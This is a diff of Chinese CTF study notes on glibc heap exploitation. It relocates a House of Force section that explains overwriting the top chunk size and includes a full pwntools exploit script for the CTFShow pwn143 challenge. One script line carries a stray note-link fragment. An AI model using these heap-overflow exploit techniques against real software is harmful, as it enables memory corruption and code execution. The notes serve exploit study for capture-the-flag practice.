@@ -243,93 +243,10 @@ delete_heap(3)
   
 p.interactive()
 ```
-## House of Force
-**在开始之前，首先要强调，该漏洞的使用对libc版本有要求，即仅能在libc2.23-2.29的版本使用该漏洞**
-~~看的几篇文章都没有说过这一点导致调试了半天，都怀疑是surfacepro可怜的4G的内存不够用导致的malloc失败~~
-`House of Force(HOF)`,是一种堆利用方法，利用该漏洞需要满足下面条件:
--  能够以溢出等方式控制到`top chunk`的`size`域
--  能够自由控制堆分配尺寸的大小
-HOF产生的条件是由于`glibc`对`top chunk`的处理，进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从`top chunk`中分割出对应的大小作为堆块的空间，那么当`top chunk`的`size`值是由用户控制的任意值时就可以使`top chunk`指向我们期望的任何位置，这就相当于一次任意地址写。
-一般而言将`size`值修改为-1(因为在比较时会把size值转化为无符号数，此时-1就是最大值)。
-这里用例题[CTFShow-pwn143](https://ctf.show/challenges#pwn143-4162)来练习：
-首先可以看到有增删查改四个函数，修改部分可以自定义输入的长度，导致可以堆溢出修改`top chunk`的`size`。
-这里我们用堆溢出修改size为`-1(0xffffffffffffffff)`，然后再`malloc(-0x60)`，这样就可以让`top chunk`的指针往回指，而本题开辟的第一个`chunk`里存放的就是`hello_message`和`goodbye_message`的地址，后续调用时也是调用这个`chunk`里存的函数，那么我们只需要将这个`chunk`里的函数地址修改为`backdoors`的地址，再调用`exit`，就可以执行`backdoors`。
-![[Pasted image 20250323155525.png]]
-可以看到现在的top chunk指的是0x16fc1050，也就是正常位置
-![[Pasted image 20250323155622.png]]
-![[Pasted image 20250323155703.png]]
-执行后可以看到top chunk修改到了heap段的头部，此时我们申请一个新的chunk就能覆盖hello_message和goodbye_message。
-```python
-from pwn import *
-
-context(arch='amd64', os='linux', log_level='debug')
-ip, port = 'pwn.challenge.ctf.show:28149'.split(':')
-elf_path = './pwn143'
-libc_path = './libc-2.23.so'
-local = True
-debug = True
-debug_word = '''
-	b add
-	b edit
-	b show
-	b delete
-'''
-if local:
-	p = process(elf_path)
-	if debug:
-		gdb.attach(p, debug_word)
-else:
-	p = remote(ip, int(port))
-
-def choose(choice):
-	p.recvuntil(b'choice:')
-	p.sendline(str(choice))
-
-def create_heap(size, content):
-	choose(2)
-	p.recvuntil(b'length:')
-	p.sendline(str(size))
-	p.recvuntil(b'name:')
-	p.send(content)
-
-def edit_heap(idx, size, content):
-	choose(3)
-	p.recvuntil(b'index:')
-	p.sendline((str(idx)))
-	p.recvuntil(b'name:')
-	p.sendline(str(size))
-	p.recvuntil(b'name:')
-	p.send(content)
-
-def show_heap():
-	choose(1)
-
-def delete_heap(idx):
-	choose(4)
-	p.recvuntil(b'index:')
-	p.sendline(str(idx))
-
-def exit():
-	choose(5)
-
-elf = ELF(elf_path)
-libc = ELF(libc_path)[[#C++下的堆]]
-backdoors = 0x400d7f
-
-create_heap(0x20, b'aaaa')
-edit_heap(0, 0x30, b'a'*0x28 + p64(0xffffffffffffffff))
-create_heap(-0x50 - 0x8, b'bbbb')
-create_heap(0x10, p64(backdoors) * 2)
-exit()
-
-p.interactive()
-```
 ## House of Orange
 **libc2.23->libc2.26**
 
 ## House of Apple
-
-## Large bin attack
 
 ## Unlink
 unlink存在于大于fastbins大小的heap中，其目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下
@@ -443,6 +360,9 @@ pause()
 
 p.interactive()
 ```
+
+## Large bin attack
+
 ## Unsorted bin
 ### 什么是unsorted bin
 首先看一下unsorted bin是什么
@@ -608,6 +528,89 @@ House of Spirit 是 `the Malloc Maleficarum` 中的一种技术。
 和 Alloc to Stack 完全一样，区别就是 Arbitrary Alloc 是将 fastbin 的 fd 劫持到任意目标地址有size域的地址，从而修改对于地址。
 比如可以分配 fastbin 到 `_malloc_hook` 的位置，相当于覆盖 `_malloc_hook`来控制程序流程
 ## teache bin
+
+## House of XXX
+## House of Force
+**在开始之前，首先要强调，该漏洞的使用对libc版本有要求，即仅能在libc2.23-2.29的版本使用该漏洞**
+~~看的几篇文章都没有说过这一点导致调试了半天，都怀疑是surfacepro可怜的4G的内存不够用导致的malloc失败~~
+`House of Force(HOF)`,是一种堆利用方法，利用该漏洞需要满足下面条件:
+-  能够以溢出等方式控制到`top chunk`的`size`域
+-  能够自由控制堆分配尺寸的大小
+HOF产生的条件是由于`glibc`对`top chunk`的处理，进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从`top chunk`中分割出对应的大小作为堆块的空间，那么当`top chunk`的`size`值是由用户控制的任意值时就可以使`top chunk`指向我们期望的任何位置，这就相当于一次任意地址写。
+一般而言将`size`值修改为-1(因为在比较时会把size值转化为无符号数，此时-1就是最大值)。
+这里用例题[CTFShow-pwn143](https://ctf.show/challenges#pwn143-4162)来练习：
+首先可以看到有增删查改四个函数，修改部分可以自定义输入的长度，导致可以堆溢出修改`top chunk`的`size`。
+这里我们用堆溢出修改size为`-1(0xffffffffffffffff)`，然后再`malloc(-0x60)`，这样就可以让`top chunk`的指针往回指，而本题开辟的第一个`chunk`里存放的就是`hello_message`和`goodbye_message`的地址，后续调用时也是调用这个`chunk`里存的函数，那么我们只需要将这个`chunk`里的函数地址修改为`backdoors`的地址，再调用`exit`，就可以执行`backdoors`。
+![[Pasted image 20250323155525.png]]
+可以看到现在的top chunk指的是0x16fc1050，也就是正常位置
+![[Pasted image 20250323155622.png]]
+![[Pasted image 20250323155703.png]]
+执行后可以看到top chunk修改到了heap段的头部，此时我们申请一个新的chunk就能覆盖hello_message和goodbye_message。
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+ip, port = 'pwn.challenge.ctf.show:28149'.split(':')
+elf_path = './pwn143'
+libc_path = './libc-2.23.so'
+local = True
+debug = True
+debug_word = '''
+	b add
+	b edit
+	b show
+	b delete
+'''
+if local:
+	p = process(elf_path)
+	if debug:
+		gdb.attach(p, debug_word)
+else:
+	p = remote(ip, int(port))
+
+def choose(choice):
+	p.recvuntil(b'choice:')
+	p.sendline(str(choice))
+
+def create_heap(size, content):
+	choose(2)
+	p.recvuntil(b'length:')
+	p.sendline(str(size))
+	p.recvuntil(b'name:')
+	p.send(content)
+
+def edit_heap(idx, size, content):
+	choose(3)
+	p.recvuntil(b'index:')
+	p.sendline((str(idx)))
+	p.recvuntil(b'name:')
+	p.sendline(str(size))
+	p.recvuntil(b'name:')
+	p.send(content)
+
+def show_heap():
+	choose(1)
+
+def delete_heap(idx):
+	choose(4)
+	p.recvuntil(b'index:')
+	p.sendline(str(idx))
+
+def exit():
+	choose(5)
+
+elf = ELF(elf_path)
+libc = ELF(libc_path)[[#C++下的堆]]
+backdoors = 0x400d7f
+
+create_heap(0x20, b'aaaa')
+edit_heap(0, 0x30, b'a'*0x28 + p64(0xffffffffffffffff))
+create_heap(-0x50 - 0x8, b'bbbb')
+create_heap(0x10, p64(backdoors) * 2)
+exit()
+
+p.interactive()
+```
 
 ## Hook
 ### realloc_hook
